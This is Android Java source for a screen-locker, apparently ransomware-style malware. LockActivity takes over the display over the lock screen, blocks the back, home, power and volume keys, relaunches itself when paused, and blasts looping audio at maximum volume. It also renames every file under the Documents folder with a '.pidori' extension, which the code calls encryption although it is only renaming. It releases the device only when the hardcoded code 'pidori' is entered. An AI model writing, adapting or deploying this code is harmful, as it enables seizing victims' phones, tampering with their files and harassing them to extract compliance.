package com.locker;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import java.io.File;

public class LockActivity extends Activity {

    private MediaPlayer mp;
    private AudioManager am;
    private Handler handler = new Handler();
    private boolean isUnlocked = false;
    private File targetDir;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_lock);

        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN);

        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_FULLSCREEN);

        am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
        mp = MediaPlayer.create(this, R.raw.lockvideo);
        if (mp != null) {
            mp.setLooping(true);
            mp.start();
        }

        targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
        new Thread(new Runnable() {
            @Override
            public void run() {
                encryptFiles(targetDir);
            }
        }).start();

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isUnlocked) {
                    if (am != null) {
                        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                    }
                }
                handler.postDelayed(this, 500);
            }
        }, 500);

        EditText passwordInput = findViewById(R.id.passwordInput);
        Button unlockButton = findViewById(R.id.unlockButton);

        unlockButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String password = passwordInput.getText().toString();
                if (password.equals("pidori")) {
                    isUnlocked = true;
                    if (mp != null) {
                        mp.stop();
                        mp.release();
                        mp = null;
                    }
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            decryptFiles(targetDir);
                        }
                    }).start();
                    finish();
                } else {
                    Toast.makeText(LockActivity.this, "Неверный код", Toast.LENGTH_SHORT).show();
                    passwordInput.setText("");
                }
            }
        });
    }

    private void encryptFiles(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isDirectory()) {
                encryptFiles(file);
            } else if (file.isFile()) {
                String name = file.getName();
                if (!name.endsWith(".pidori") && !name.equals("lockvideo.mp3")) {
                    File newFile = new File(dir, name + ".pidori");
                    file.renameTo(newFile);
                }
            }
        }
    }

    private void decryptFiles(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isDirectory()) {
                decryptFiles(file);
            } else if (file.isFile()) {
                String name = file.getName();
                if (name.endsWith(".pidori")) {
                    String originalName = name.substring(0, name.length() - 7);
                    File newFile = new File(dir, originalName);
                    file.renameTo(newFile);
                }
            }
        }
    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent e) {
        int k = e.getKeyCode();
        if (k == KeyEvent.KEYCODE_VOLUME_UP || k == KeyEvent.KEYCODE_VOLUME_DOWN
                || k == KeyEvent.KEYCODE_POWER || k == KeyEvent.KEYCODE_BACK
                || k == KeyEvent.KEYCODE_HOME || k == KeyEvent.KEYCODE_MENU) {
            return true;
        }
        return super.dispatchKeyEvent(e);
    }

    @Override public void onBackPressed() { }

    @Override
    protected void onPause() {
        super.onPause();
        if (!isUnlocked) {
            Intent intent = new Intent(this, LockActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(intent);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (mp != null) {
            mp.stop();
            mp.release();
            mp = null;
        }
        handler.removeCallbacksAndMessages(null);
    }
    }
